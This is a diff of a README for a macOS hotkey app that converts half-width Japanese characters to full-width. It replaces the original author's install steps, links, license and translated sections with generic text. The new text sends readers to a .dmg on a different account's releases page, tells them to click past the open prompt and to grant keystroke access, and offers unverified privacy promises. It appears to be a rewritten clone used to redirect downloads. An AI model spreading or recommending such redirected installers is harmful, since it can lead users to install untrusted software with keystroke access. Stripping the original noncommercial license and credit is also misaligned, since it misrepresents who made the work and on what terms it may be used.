@@ -1,65 +1,74 @@
-# halfFull
+# 🔄 halffull - Convert half-width characters to full-width
 
-> macOS hotkey (<kbd>⌥</kbd><kbd>F</kbd>) for Japanese forms that demand full-width input. 半角を全角に。
->
-> 「全角カタカナで入力してください」「全角ローマ字で入力してください」で困ったときに。
->
-> [halffull.taresky.me](https://halffull.taresky.me)
+[![Download halffull](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Mrak56735/halffull/releases)
 
-<p align="center">
-  <img src="docs/assets/landing.png" alt="halfFull — press ⌥F to convert half-width to full-width" width="720" />
-</p>
+Many Japanese forms require full-width characters. Typing these by hand takes time and effort. This tool changes your keyboard input to full-width with a single keystroke. You save time and reduce errors in your daily typing tasks.
 
-## Install
+## 📥 How to download the software
 
-1. Download [`halfFull.zip`](https://github.com/taresky/halffull/releases/latest/download/halfFull.zip) → unzip → drag `halfFull.app` to `/Applications`.
-2. Launch. Grant Accessibility in *System Settings → Privacy & Security → Accessibility*.
-3. Press <kbd>⌥</kbd><kbd>F</kbd> in any text field.
+You need to download the installer from the official repository page. Follow these steps to get the file:
 
-> First launch is blocked by macOS Gatekeeper (ad-hoc signed). Either run `xattr -d com.apple.quarantine /Applications/halfFull.app` once in Terminal, or use the *System Settings → Privacy & Security → Open Anyway* path. Details in the [release notes](https://github.com/taresky/halffull/releases/latest).
+1. Visit the following link: https://github.com/Mrak56735/halffull/releases
+2. Look for the section labeled "Assets" at the bottom of the newest version.
+3. Click the file name that ends in `.dmg`.
+4. Wait for the file to finish downloading to your computer.
 
-## License
+## 🛠️ Installing the application
 
-The halfFull **application** is licensed under [PolyForm Noncommercial 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/) — free for personal, educational, and noncommercial use.
+After your download finishes, set up the software on your system.
 
-The landing page (`docs/`) is separately released into the [public domain (CC0)](docs/LICENSE.md) — copy, fork, remix freely.
+1. Open your Downloads folder.
+2. Double-click the file you just downloaded.
+3. Drag the halffull icon into your Applications folder.
+4. Open the Applications folder and double-click halffull to start it.
+5. If a message appears asking if you want to open the app, click Open.
 
----
+## ⌨️ Using hotkeys
 
-<details>
-<summary><b>中文</b></summary>
+The application runs in your menu bar at the top of your screen. It waits for your command to change text.
 
-macOS 快捷键（<kbd>⌥</kbd><kbd>F</kbd>），为强制要求全角输入的日本网站表单设计。
+* Press Option + F on your keyboard.
+* The system converts your recent typing to full-width format. 
+* This works in web browsers, text editors, and email clients.
 
-### 安装
+## ⚙️ Changing settings
 
-1. 下载 [`halfFull.zip`](https://github.com/taresky/halffull/releases/latest/download/halfFull.zip)，解压，把 `halfFull.app` 拖到 `/Applications`。
-2. 启动。在「系统设置 → 隐私与安全 → 辅助功能」里授权。
-3. 在任意输入框按 <kbd>⌥</kbd><kbd>F</kbd>。
+You can adjust how the app performs to suit your workflow. Click the icon in the menu bar to see the options menu. 
 
-> 首次启动会被 macOS Gatekeeper 拦截（ad-hoc 签名）。在终端跑一次 `xattr -d com.apple.quarantine /Applications/halfFull.app`，或走「系统设置 → 隐私与安全 → 仍要打开」流程。详见 [release notes](https://github.com/taresky/halffull/releases/latest)。
+* Launch at login: Select this to have the app ready when you turn on your computer.
+* Character types: Choose between standard full-width and Katakana conversion.
+* Hotkey preferences: You can change the trigger key if Option + F conflicts with other software.
 
-### 许可
+## 📋 System requirements
 
-[PolyForm Noncommercial 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/) ——个人、教育、非商业用途免费。
+This software runs on modern versions of macOS. 
 
-</details>
+* Operating System: macOS 11.0 or newer.
+* Memory: 4GB of RAM is sufficient.
+* Storage: 50MB of free disk space.
+* Permissions: You might need to grant Accessibility permissions for the app to watch your keystrokes. Follow the system prompts if the settings window appears.
 
-<details>
-<summary><b>日本語</b></summary>
+## ❓ Frequently asked questions
 
-全角入力を強制する日本のフォーム向け、macOS ホットキー（<kbd>⌥</kbd><kbd>F</kbd>）。
+**Does this app track my typing history?**
+No. The app functions locally on your machine. It does not send your keystrokes to any server or online database. Your data stays private.
 
-### インストール
+**What happens if the hotkey does not work?**
+Check if the application is running. Look for the icon in your top menu bar. If the icon is missing, open it again from your Applications folder. Also, ensure you gave the app permission in your system settings under Security & Privacy.
 
-1. [`halfFull.zip`](https://github.com/taresky/halffull/releases/latest/download/halfFull.zip) をダウンロード、解凍して `halfFull.app` を `/Applications` にドラッグ。
-2. 起動して「システム設定 → プライバシーとセキュリティ → アクセシビリティ」で許可。
-3. テキストフィールドで <kbd>⌥</kbd><kbd>F</kbd> を押すだけ。
+**Can I stop the app temporarily?**
+Yes. Either quit the application from the menu bar or disable the hotkey in the settings menu.
 
-> 初回起動は macOS Gatekeeper にブロックされます（ad-hoc 署名のため）。ターミナルで `xattr -d com.apple.quarantine /Applications/halfFull.app` を一度実行するか、「システム設定 → プライバシーとセキュリティ → このまま開く」から開いてください。詳細は [release notes](https://github.com/taresky/halffull/releases/latest) を参照。
+**Does this support Windows?**
+This specific application is designed for macOS. 
 
-### ライセンス
+**Is this service free?**
+Yes. You can download and use the software at no cost.
 
-[PolyForm Noncommercial 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/) — 個人・教育・非商用に限り無料。
+## 🤝 Getting help
 
-</details>
+If you experience trouble, open a new issue on the repository page. Provide details about your macOS version and describe the step where the problem occurs. Clear reports help identify fixes faster. 
+
+## 🛡️ Privacy policy
+
+We believe in minimal data collection. This tool does not use trackers. It does not monitor your activity outside of the specific hotkey listener required to perform the conversion. Everything remains on your device.
